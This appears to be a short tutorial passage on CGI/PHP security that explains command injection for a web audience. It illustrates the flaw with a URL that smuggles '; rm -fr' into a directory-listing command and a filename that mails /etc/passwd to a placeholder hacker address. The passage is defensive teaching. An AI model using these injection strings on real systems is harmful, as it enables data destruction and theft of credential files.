    # Security


    | I''m not an expert on Web security. Please do further research on this critical
    topic! | Caution |


    CGI really has only one large security hole that I can see. If you pass information
    that comes from a remote site to an operating system command, you are asking for
    trouble. Let''s look at an example to understand the problem because it is not
    obvious.


    Suppose you have a CGI script that formats a directory listing and generates a
    Web page that lets visitors view the listing. In addition, let''s say the name
    of the directory to display is passed to your program using the PATH_INFO environment
    variable. The following URL could be used to call your program:


    http://www.foo.com/cgi-bin/dirlist.php/docs


    Inside your program, the PATH_INFO environment variable is set to docs. In order
    to get the directory listing, all that is needed is a call to the ls. Everything
    looks good, right? But what if the ls program was invoked with this URL?


    http://www.foo.com/cgi-bin/dirlist.php/; rm -fr-


    Now, all of a sudden, you are faced with the possibility of files being deleted
    because the semicolon lets multiple commands be executed on one command line.


    This same type of security hole is possible any time you try to run an external
    command. You might be tempted to use the mail, sendmail, or grep commands to save
    time while writing your CGI program, but since all of these programs are easily
    duplicated using PHP, try to resist the temptation.


    Another security hole is related to using external data to open or create files.
    Some enterprising hacker could use mail hacker@hacker.com < /etc/passwd as the
    filename to mail your password file or any other file to himself.'
